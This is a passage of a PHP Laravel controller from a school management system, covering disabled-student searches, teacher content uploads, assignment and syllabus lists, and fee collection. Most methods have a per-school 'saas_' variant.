            return view('backEnd.studentInformation.disabled_student', compact('students', 'classes'));
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function saas_disabledStudent(Request $request,$school_id)
    {
        try {
            $students = AramiscStudent::where('active_status', 0)->where('academic_id', AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR())->where('school_id',$school_id)->get();
            $classes = AramiscClass::where('active_status', 1)->where('academic_id', AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR())->where('school_id',$school_id)->get();

            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                $data = [];
                $data['students'] = $students->toArray();
                $data['classes'] = $classes->toArray();
                return ApiBaseMethod::sendResponse($data, null);
            }
            return view('backEnd.studentInformation.disabled_student', compact('students', 'classes'));
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function disabledStudentSearch(Request $request)
    {
        try {
            $students = AramiscStudent::query();
            $students->where('academic_id', AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR())->where('active_status', 0);
            if ($request->class != "") {
                $students->where('class_id', $request->class);
            }
            if ($request->section != "") {
                $students->where('section_id', $request->section);
            }
            if ($request->name != "") {
                $students->where('full_name', 'like', '%' . $request->name . '%');
            }
            if ($request->roll_no != "") {
                $students->where('roll_no', 'like', '%' . $request->roll_no . '%');
            }
            $students = $students->where('academic_id', AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR())->get();

            $classes = AramiscClass::where('active_status', 1)->where('academic_id', AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR())->get();

            $class_id = $request->class;
            $section_id = $request->section;
            $name = $request->name;
            $roll_no = $request->roll_no;


            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                $data = [];
                $data['students'] = $students->toArray();
                $data['classes'] = $classes->toArray();
                $data['class_id'] = $class_id;
                $data['section_id'] = $section_id;
                $data['name'] = $name;
                $data['roll_no'] = $roll_no;
                return ApiBaseMethod::sendResponse($data, null);
            }

            return view('backEnd.studentInformation.disabled_student', compact('students', 'classes', 'class_id', 'section_id', 'name', 'roll_no'));
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function saas_disabledStudentSearch(Request $request, $school_id)
    {
        try {
            $students = AramiscStudent::query();
            $students->where('academic_id', AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR())->where('active_status', 0)->where('school_id',$school_id);
            if ($request->class != "") {
                $students->where('class_id', $request->class);
            }
            if ($request->section != "") {
                $students->where('section_id', $request->section);
            }
            if ($request->name != "") {
                $students->where('full_name', 'like', '%' . $request->name . '%');
            }
            if ($request->roll_no != "") {
                $students->where('roll_no', 'like', '%' . $request->roll_no . '%');
            }
            $students = $students->where('academic_id', AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR())->where('school_id',$school_id)->get();

            $classes = AramiscClass::where('active_status', 1)->where('academic_id', AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR())->where('school_id',$school_id)->get();

            $class_id = $request->class;
            $section_id = $request->section;
            $name = $request->name;
            $roll_no = $request->roll_no;


            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                $data = [];
                $data['students'] = $students->toArray();
                $data['classes'] = $classes->toArray();
                $data['class_id'] = $class_id;
                $data['section_id'] = $section_id;
                $data['name'] = $name;
                $data['roll_no'] = $roll_no;
                return ApiBaseMethod::sendResponse($data, null);
            }

            return view('backEnd.studentInformation.disabled_student', compact('students', 'classes', 'class_id', 'section_id', 'name', 'roll_no'));
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function uploadContentList(Request $request)
    {

        try {
            $contentTypes = AramiscContentType::where('academic_id', AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR())->get();

            if (Auth()->user()->role_id == 1) {
                $uploadContents = AramiscTeacherUploadContent::where('available_for_admin', 1)->orWhere('created_by', Auth::user()->id)->where('academic_id', AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR())->get();
            } else {
                $uploadContents = AramiscTeacherUploadContent::Where('created_by', Auth::user()->id)->where('academic_id', AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR())->get();
            }

            $classes = AramiscClass::where('active_status', '=', '1')->where('academic_id', AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR())->get();

            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                $data = [];
                $data['contentTypes'] = $contentTypes->toArray();
                $data['uploadContents'] = $uploadContents->toArray();
                $data['classes'] = $classes->toArray();
                return ApiBaseMethod::sendResponse($data, 'Content uploaded successfully.');
            }
            return view('backEnd.teacher.uploadContentList', compact('contentTypes', 'classes', 'uploadContents'));
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function saas_uploadContentList(Request $request, $school_id)
    {

        try {
            $contentTypes = AramiscContentType::where('academic_id', AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR())->where('school_id',$school_id)->get();

            if (Auth()->user()->role_id == 1) {
                $uploadContents = AramiscTeacherUploadContent::where('available_for_admin', 1)->orWhere('created_by', Auth::user()->id)->where('academic_id', AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR())->where('school_id',$school_id)->get();
            } else {
                $uploadContents = AramiscTeacherUploadContent::Where('created_by', Auth::user()->id)->where('academic_id', AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR())->where('school_id',$school_id)->get();
            }

            $classes = AramiscClass::where('active_status', '=', '1')->where('academic_id', AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR())->where('school_id',$school_id)->get();

            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                $data = [];
                $data['contentTypes'] = $contentTypes->toArray();
                $data['uploadContents'] = $uploadContents->toArray();
                $data['classes'] = $classes->toArray();
                return ApiBaseMethod::sendResponse($data, 'Content uploaded successfully.');
            }
            return view('backEnd.teacher.uploadContentList', compact('contentTypes', 'classes', 'uploadContents'));
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function saveUploadContent(Request $request)
    {
        DB::statement('SET FOREIGN_KEY_CHECKS=0;');

        if (isset($request->available_for)) {
            foreach ($request->available_for as $value) {
                if ($value == 'student') {
                    if (!isset($request->all_classes)) {
                        $request->validate([
                            'content_title' => "required|max:200",
                            'content_type' => "required",
                            'upload_date' => "required",
                            'content_file' => "required|mimes:pdf,doc,docx,jpg,jpeg,png",
                            'class' => "required",
                            'section' => "required",
                        ]);
                    } else {
                        $request->validate([
                            'content_title' => "required|max:200",
                            'content_type' => "required",
                            'upload_date' => "required",
                            'content_file' => "required|mimes:pdf,doc,docx,jpg,jpeg,png",
                        ]);
                    }
                }
            }
        } else {
            $request->validate(
                [
                    'content_title' => "required:max:200",
                    'content_type' => "required",
                    'available_for' => 'required|array',
                    'upload_date' => "required",
                    'content_file' => "required|mimes:pdf,doc,docx,jpg,jpeg,png",
                ],
                [
                    'available_for.required' => 'At least one checkbox required!',
                ]
            );
        }
        try {
            $maxFileSize = AramiscGeneralSettings::first('file_size')->file_size;
            $file = $request->file('content_file');
            $fileSize =  filesize($file);
            $fileSizeKb = ($fileSize / 1000000);
            if($fileSizeKb >= $maxFileSize){
                Toastr::error( 'Max upload file size '. $maxFileSize .' Mb is set in system', 'Failed');
                return redirect()->back();
            }

            $fileName = "";

            if ($request->file('content_file') != "") {
                $file = $request->file('content_file');
                $fileName = md5($file->getClientOriginalName() . time()) . "." . $file->getClientOriginalExtension();
                $file->move('public/uploads/upload_contents/', $fileName);
                $fileName = 'public/uploads/upload_contents/' . $fileName;
            }

            $y = '2012';
            $m = '2012';
            $d = '2012';
            $uploadContents = new AramiscTeacherUploadContent();
            $uploadContents->content_title = $request->content_title;
            $uploadContents->content_type = $request->content_type;
            $uploadContents->source_url = $request->input('source_url');
            foreach ($request->available_for as $value) {
                if ($value == 'admin') {
                    $uploadContents->available_for_admin = 1;
                }

                if ($value == 'student') {
                    if (isset($request->all_classes)) {
                        $uploadContents->available_for_all_classes = 1;
                    } else {
                        $uploadContents->class = $request->class;
                        $uploadContents->section = $request->section;
                    }
                }
            }

            $uploadContents->upload_date = date('Y-m-d', strtotime($request->upload_date));
            $uploadContents->description = $request->description;
            $uploadContents->upload_file = $fileName;
            $uploadContents->created_by = Auth()->user()->id;
            $results = $uploadContents->save();

            if ($request->content_type == 'as') {
                $purpose = 'assignment';
            } elseif ($request->content_type == 'st') {
                $purpose = 'Study Material';
            } elseif ($request->content_type == 'sy') {
                $purpose = 'Syllabus';
            } elseif ($request->content_type == 'ot') {
                $purpose = 'Others Download';
            }

            foreach ($request->available_for as $value) {
                if ($value == 'admin') {
                    $roles = AramiscRole::where('id', '=', 1) /* ->where('id', '!=', 2)->where('id', '!=', 3)->where('id', '!=', 9) */->where('academic_id', AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR())->where(function ($q) {
                        $q->where('school_id', Auth::user()->school_id)->orWhere('type', 'System');
                    })->get();
                    foreach ($roles as $role) {
                        $staffs = AramiscStaff::where('role_id', $role->id)->where('academic_id', AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR())->get();
                        foreach ($staffs as $staff) {
                            $notification = new AramiscNotification;
                            $notification->user_id = $staff->user_id;
                            $notification->role_id = $role->id;
                            if ($request->content_type == 'as') {
                                $notification->url = 'assignment-list';
                            } elseif ($request->content_type == 'st') {
                                $notification->url = 'study-metarial-list';
                            } elseif ($request->content_type == 'sy') {
                                $notification->url = 'syllabus-list';
                            } elseif ($request->content_type == 'ot') {
                                $notification->url = 'other-download-list';
                            }
                            $notification->date = date('Y-m-d');
                            $notification->school_id = Auth::user()->school_id;
                            $notification->academic_id = AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR();
                            $notification->message = $purpose . ' updated';
                            $notification->save();
                        }
                    }
                }
                if ($value == 'student') {
                    if (isset($request->all_classes)) {
                        $students = AramiscStudent::select('id', 'user_id')->where('academic_id', AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR())->get();
                        foreach ($students as $student) {
                            $notification = new AramiscNotification;
                            $notification->user_id = $student->id;
                            $notification->role_id = 2;
                            if ($request->content_type == 'as') {
                                $notification->url = 'student-assignment';
                            } elseif ($request->content_type == 'st') {
                                $notification->url = 'student-study-material';
                            } elseif ($request->content_type == 'sy') {
                                $notification->url = 'student-syllabus';
                            } elseif ($request->content_type == 'ot') {
                                $notification->url = 'student-others-download';
                            }
                            $notification->school_id = Auth::user()->school_id;
                            $notification->academic_id = AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR();
                            $notification->date = date('Y-m-d');
                            $notification->message = $purpose . ' updated';
                            $notification->save();
                        }
                    } else {
                        $students = AramiscStudent::select('id')->where('class_id', $request->class)->where('section_id', $request->section)->where('academic_id', AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR())->get();
                        foreach ($students as $student) {
                            $notification = new AramiscNotification;
                            $notification->user_id = $student->id;
                            $notification->role_id = 2;
                            if ($request->content_type == 'as') {
                                $notification->url = 'student-assignment';
                            } elseif ($request->content_type == 'st') {
                                $notification->url = 'student-study-material';
                            } elseif ($request->content_type == 'sy') {
                                $notification->url = 'student-syllabus';
                            } elseif ($request->content_type == 'ot') {
                                $notification->url = 'student-others-download';
                            }
                            $notification->school_id = Auth::user()->school_id;
                            $notification->academic_id = AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR();
                            $notification->date = date('Y-m-d');
                            $notification->message = $purpose . ' updated';
                            $notification->save();
                        }
                    }
                }
            }

            if ($results) {
                Toastr::success('Operation successful', 'Success');
                return redirect()->back();
            } else {
                Toastr::error('Operation Failed', 'Failed');
                return redirect()->back();
            }
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function deleteUploadContent(Request $request, $id)
    {

        try {
            $uploadContent = AramiscTeacherUploadContent::find($id);
            if ($uploadContent->upload_file != "") {
                unlink($uploadContent->upload_file);
            }
            $result = $uploadContent->delete();

            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                if ($result) {
                    return ApiBaseMethod::sendResponse(null, 'Content has been deleted successfully.');
                } else {
                    return ApiBaseMethod::sendError('Something went wrong, please try again.');
                }
            } else {
                if ($result) {
                    Toastr::success('Operation successful', 'Success');
                    return redirect()->back();
                } else {
                    Toastr::error('Operation Failed', 'Failed');
                    return redirect()->back();
                }
            }
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function saas_deleteUploadContent(Request $request,$school_id, $id)
    {

        try {
            $uploadContent = AramiscTeacherUploadContent::where('school_id',$school_id)->where('id',$id)->find();
            if ($uploadContent->upload_file != "") {
                unlink($uploadContent->upload_file);
            }
            $result = $uploadContent->delete();

            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                if ($result) {
                    return ApiBaseMethod::sendResponse(null, 'Content has been deleted successfully.');
                } else {
                    return ApiBaseMethod::sendError('Something went wrong, please try again.');
                }
            } else {
                if ($result) {
                    Toastr::success('Operation successful', 'Success');
                    return redirect()->back();
                } else {
                    Toastr::error('Operation Failed', 'Failed');
                    return redirect()->back();
                }
            }
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function assignmentList(Request $request)
    {

        try {
            $user = Auth()->user();
            if (Auth()->user()->role_id == 1) {
                AramiscNotification::where('user_id', $user->id)->where('role_id', 1)->update(['is_read' => 1]);
            }

            if (Auth()->user()->id == 1) {
                $uploadContents = AramiscTeacherUploadContent::where('content_type', 'as')->where('academic_id', AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR())->get();
            } else {
                $uploadContents = AramiscTeacherUploadContent::where('content_type', 'as')->Where('created_by', Auth::user()->id)->where('academic_id', AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR())->get();
            }

            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                return ApiBaseMethod::sendResponse($uploadContents->toArray(), 'null');
            }

            return view('backEnd.teacher.assignmentList', compact('uploadContents'));
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function saas_assignmentList(Request $request, $school_id)
    {

        try {
            $user = Auth()->user();
            if (Auth()->user()->role_id == 1) {
                AramiscNotification::where('user_id', $user->id)->where('role_id', 1)->where('school_id',$school_id)->update(['is_read' => 1]);
            }

            if (Auth()->user()->id == 1) {
                $uploadContents = AramiscTeacherUploadContent::where('content_type', 'as')->where('academic_id', AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR())->get();
            } else {
                $uploadContents = AramiscTeacherUploadContent::where('content_type', 'as')->Where('created_by', Auth::user()->id)->where('academic_id', AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR())->get();
            }

            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                return ApiBaseMethod::sendResponse($uploadContents->toArray(), 'null');
            }

            return view('backEnd.teacher.assignmentList', compact('uploadContents'));
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function studyMetarialList(Request $request)
    {

        try {
            if (Auth()->user()->id == 1) {
                $uploadContents = AramiscTeacherUploadContent::where('content_type', 'st')->where('academic_id', AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR())->get();
            } else {
                $uploadContents = AramiscTeacherUploadContent::where('content_type', 'st')->Where('created_by', Auth::user()->id)->where('academic_id', AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR())->get();
            }

            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                return ApiBaseMethod::sendResponse($uploadContents->toArray(), 'null');
            }
            return view('backEnd.teacher.studyMetarialList', compact('uploadContents'));
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function saas_studyMetarialList(Request $request , $school_id)
    {

        try {
            if (Auth()->user()->id == 1) {
                $uploadContents = AramiscTeacherUploadContent::where('content_type', 'st')->where('academic_id', AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR())->where('school_id',$school_id)->get();
            } else {
                $uploadContents = AramiscTeacherUploadContent::where('content_type', 'st')->Where('created_by', Auth::user()->id)->where('academic_id', AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR())->where('school_id',$school_id)->get();
            }

            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                return ApiBaseMethod::sendResponse($uploadContents->toArray(), 'null');
            }
            return view('backEnd.teacher.studyMetarialList', compact('uploadContents'));
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function syllabusList(Request $request)
    {
        try {
            if (Auth()->user()->id == 1) {
                $uploadContents = AramiscTeacherUploadContent::where('content_type', 'sy')->where('academic_id', AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR())->get();
            } else {
                $uploadContents = AramiscTeacherUploadContent::where('content_type', 'sy')->Where('created_by', Auth::user()->id)->where('academic_id', AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR())->get();
            }

            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                return ApiBaseMethod::sendResponse($uploadContents->toArray(), 'null');
            }
            return view('backEnd.teacher.syllabusList', compact('uploadContents'));
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function saas_syllabusList(Request $request, $school_id)
    {
        try {
            if (Auth()->user()->id == 1) {
                $uploadContents = AramiscTeacherUploadContent::where('content_type', 'sy')->where('academic_id', AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR())->where('school_id',$school_id)->get();
            } else {
                $uploadContents = AramiscTeacherUploadContent::where('content_type', 'sy')->Where('created_by', Auth::user()->id)->where('academic_id', AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR())->where('school_id',$school_id)->get();
            }

            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                return ApiBaseMethod::sendResponse($uploadContents->toArray(), 'null');
            }
            return view('backEnd.teacher.syllabusList', compact('uploadContents'));
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function otherDownloadList(Request $request)
    {

        try {
            if (Auth()->user()->id == 1) {
                $uploadContents = AramiscTeacherUploadContent::where('content_type', 'ot')->where('academic_id', AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR())->get();
            } else {
                $uploadContents = AramiscTeacherUploadContent::where('content_type', 'ot')->Where('created_by', Auth::user()->id)->where('academic_id', AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR())->get();
            }

            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                return ApiBaseMethod::sendResponse($uploadContents->toArray(), 'null');
            }
            return view('backEnd.teacher.otherDownloadList', compact('uploadContents'));
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function saas_otherDownloadList(Request $request, $school_id)
    {

        try {
            if (Auth()->user()->id == 1) {
                $uploadContents = AramiscTeacherUploadContent::where('content_type', 'ot')->where('academic_id', AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR())->where('school_id',$school_id)->get();
            } else {
                $uploadContents = AramiscTeacherUploadContent::where('content_type', 'ot')->Where('created_by', Auth::user()->id)->where('academic_id', AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR())->where('school_id',$school_id)->get();
            }

            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                return ApiBaseMethod::sendResponse($uploadContents->toArray(), 'null');
            }
            return view('backEnd.teacher.otherDownloadList', compact('uploadContents'));
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function collectFees(Request $request)
    {
        try {
            $classes = AramiscClass::where('active_status', 1)->where('academic_id', AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR())->get();
            if (ApiBaseMethod::checkUrl($request->fullUrl())) {

                return ApiBaseMethod::sendResponse($classes, null);
            }
            return view('backEnd.feesCollection.collect_fees', compact('classes'));
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function saas_collectFees(Request $request, $school_id)
    {
        try {
            $classes = AramiscClass::where('active_status', 1)->where('academic_id', AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR())->where('school_id',$school_id)->get();
            if (ApiBaseMethod::checkUrl($request->fullUrl())) {

                return ApiBaseMethod::sendResponse($classes, null);
            }
            return view('backEnd.feesCollection.collect_fees', compact('classes'));
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function collectFeesStudentApi(Request $request, $id)
    {
        try {
            $student = AramiscStudent::withoutGlobalScopes()->where('user_id', $id)->first();
            $fees_assigneds = AramiscFeesAssign::where('student_id', $id)->orderBy('id', 'desc')->get();

            $fees_assigneds2 = DB::table('aramisc_fees_assigns')
                                ->select('aramisc_fees_assigns.id as fees_assign_id','aramisc_fees_types.id as fees_type_id', 'aramisc_fees_types.name', 'aramisc_fees_masters.date as due_date', 'aramisc_fees_masters.amount as amount','applied_discount')
                                ->join('aramisc_fees_masters', 'aramisc_fees_masters.id', '=', 'aramisc_fees_assigns.fees_master_id')
                                ->join('aramisc_fees_types', 'aramisc_fees_types.id', '=', 'aramisc_fees_masters.fees_type_id')
                                ->where('aramisc_fees_assigns.student_id', $student->id)
                                ->get();


            $i = 0;
            $d = [];

            foreach ($fees_assigneds2 as $row) {
                $d[$i]['fees_assign_id'] = $row->fees_assign_id;
                $d[$i]['user_id'] = (int)$id;
                $d[$i]['fees_type_id'] = $row->fees_type_id;
                $d[$i]['fees_name'] = $row->name;
                $d[$i]['due_date'] = $row->due_date;
                $d[$i]['amount'] = $row->amount;
                $d[$i]['paid'] = DB::table('aramisc_fees_payments')->where('active_status',1)->where('fees_type_id', $row->fees_type_id)->where('student_id', $student->id)->sum('amount');
                $d[$i]['fine'] = DB::table('aramisc_fees_payments')->where('active_status',1)->where('fees_type_id', $row->fees_type_id)->where('student_id', $student->id)->sum('fine');
                $d[$i]['discount_amount'] = $row->applied_discount;
                $d[$i]['balance'] = ((float) $d[$i]['amount'] + (float) $d[$i]['fine'])  - ((float) $d[$i]['paid'] + (float) $d[$i]['discount_amount']);
                $i++;
            }


            $fees_discounts = AramiscFeesAssignDiscount::where('student_id', $id)->get();

            $applied_discount = [];
            foreach ($fees_discounts as $fees_discount) {
                $fees_payment = AramiscFeesPayment::select('fees_discount_id')->where('fees_discount_id', $fees_discount->id)->first();
                if (isset($fees_payment->fees_discount_id)) {
                    $applied_discount[] = $fees_payment->fees_discount_id;
                }
            }


            $currency_symbol = AramiscGeneralSettings::select('currency_symbol')->first();

            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                $data = [];

                $data['fees'] = $d;
                $data['currency_symbol'] = $currency_symbol;
                return ApiBaseMethod::sendResponse($data, null);
            }

            return view('backEnd.feesCollection.collect_fees_student_wise', compact('student', 'fees_assigneds', 'fees_discounts', 'applied_discount'));
        } catch (\Exception $e) {

            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function saas_collectFeesStudentApi(Request $request,$school_id, $id)
    {
        try {
            $student = AramiscStudent::withOutGlobalScope(SchoolScope::class)->where('user_id', $id)->where('school_id',$school_id)->first();
            $fees_assigneds = AramiscFeesAssign::withOutGlobalScope(StatusAcademicSchoolScope::class)->where('student_id', $id)->where('school_id',$school_id)->orderBy('id', 'desc')->get();

            $fees_assigneds2 = DB::table('aramisc_fees_assigns')
                ->select('aramisc_fees_types.id as fees_type_id', 'aramisc_fees_types.name', 'aramisc_fees_masters.date as due_date', 'aramisc_fees_masters.amount as amount','applied_discount')
                ->join('aramisc_fees_masters', 'aramisc_fees_masters.id', '=', 'aramisc_fees_assigns.fees_master_id')
                ->join('aramisc_fees_types', 'aramisc_fees_types.id', '=', 'aramisc_fees_masters.fees_type_id')
                ->where('aramisc_fees_assigns.student_id', $student->id)
                ->where('aramisc_fees_assigns.school_id',$school_id)
                ->get();


            $i = 0;
            $d = [];

            foreach ($fees_assigneds2 as $row) {
                $d[$i]['fees_type_id'] = $row->fees_type_id;
                $d[$i]['fees_name'] = $row->name;
                $d[$i]['due_date'] = $row->due_date;
                $d[$i]['amount'] = $row->amount;
                $d[$i]['paid'] = DB::table('aramisc_fees_payments')->where('active_status',1)->where('fees_type_id', $row->fees_type_id)->where('student_id', $student->id)->sum('amount');
                $d[$i]['fine'] = DB::table('aramisc_fees_payments')->where('active_status',1)->where('fees_type_id', $row->fees_type_id)->where('student_id', $student->id)->sum('fine');
                $d[$i]['discount_amount'] = $row->applied_discount;
                $d[$i]['balance'] = ((float) $d[$i]['amount'] + (float) $d[$i]['fine'])  - ((float) $d[$i]['paid'] + (float) $d[$i]['discount_amount']);
                $i++;
            }


            $fees_discounts = AramiscFeesAssignDiscount::where('student_id', $id)->get();

            $applied_discount = [];
            foreach ($fees_discounts as $fees_discount) {
                $fees_payment = AramiscFeesPayment::select('fees_discount_id')->where('fees_discount_id', $fees_discount->id)->first();
                if (isset($fees_payment->fees_discount_id)) {
                    $applied_discount[] = $fees_payment->fees_discount_id;
                }
            }


            $currency_symbol = AramiscGeneralSettings::select('currency_symbol')->first();

            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                $data = [];

                $data['fees'] = $d;
                $data['currency_symbol'] = $currency_symbol;
                return ApiBaseMethod::sendResponse($data, null);
            }

            return view('backEnd.feesCollection.collect_fees_student_wise', compact('student', 'fees_assigneds', 'fees_discounts', 'applied_discount'));
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function collectFeesSearch(Request $request)
    {
        $input = $request->all();
        $validator = Validator::make($input, [
            'class' => 'required'
        ]);

        if ($validator->fails()) {
            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                return ApiBaseMethod::sendError('Validation Error.', $validator->errors());
            }
            return redirect()->back()
                ->withErrors($validator)
                ->withInput();
        }
        try {
            $students = AramiscStudent::query();
            $students->where('class_id', $request->class);
            if ($request->section != "") {
                $students->where('section_id', $request->section);
            }
            if ($request->keyword != "") {
                $students->where('full_name', 'like', '%' . $request->keyword . '%')->orWhere('admission_no', $request->keyword)->orWhere('roll_no', $request->keyword)->orWhere('national_id_no', $request->keyword)->orWhere('local_id_no', $request->keyword);
            }
            $students = $students->where('academic_id', AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR())->get();

            if ($students->isEmpty()) {
                if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                    return ApiBaseMethod::sendError('No result found');
                }

                return redirect('collect-fees')->with('message-danger', 'No result found');
            }

            $classes = AramiscClass::where('active_status', 1)->where('academic_id', AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR())->get();

            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                $data = [];
                $data['classes'] = $classes->toArray();
                $data['students'] = $students->toArray();
                return ApiBaseMethod::sendResponse($data, null);
            }

            $class_info = AramiscClass::find($request->class);
            $search_info['class_name'] = @$class_info->class_name;
            if ($request->section != "") {
                $section_info = AramiscSection::find($request->section);
                $search_info['section_name'] = @$section_info->section_name;
            }

            if ($request->keyword != "") {
                $search_info['keyword'] = $request->keyword;
            }


            return view('backEnd.feesCollection.collect_fees', compact('classes', 'students', 'search_info'));
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function searchFeesPayment(Request $request)
    {
        try {
            $fees_payments = AramiscFeesPayment::get();
            $classes = AramiscClass::where('active_status', 1)->get();
            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                return ApiBaseMethod::sendResponse($fees_payments, null);
            }
            return view('backEnd.feesCollection.search_fees_payment', compact('fees_payments', 'classes'));
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function saas_searchFeesPayment(Request $request, $school_id)
    {
        try {
            $fees_payments = AramiscFeesPayment::where('school_id',$school_id)->get();
            $classes = AramiscClass::where('active_status', 1)->where('school_id',$school_id)->get();
            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                return ApiBaseMethod::sendResponse($fees_payments, null);
            }
            return view('backEnd.feesCollection.search_fees_payment', compact('fees_payments', 'classes'));
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function feesPaymentSearch(Request $request)
    {
        $input = $request->all();
        $validator = Validator::make($input, [
            'class' => 'required',
            'section' => 'required'
        ]);

        if ($validator->fails()) {
            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                return ApiBaseMethod::sendError('Validation Error.', $validator->errors());
            }
            return redirect()->back()
                ->withErrors($validator)
                ->withInput();
        }
        try {
            $classes = AramiscClass::where('active_status', 1)->get();
            $fees_payments = DB::table('aramisc_fees_payments')
                ->join('aramisc_students', 'aramisc_fees_payments.student_id', '=', 'aramisc_students.id')
                ->join('aramisc_fees_masters', 'aramisc_fees_payments.fees_type_id', '=', 'aramisc_fees_masters.fees_type_id')
                ->join('aramisc_fees_groups', 'aramisc_fees_masters.fees_type_id', '=', 'aramisc_fees_groups.id')
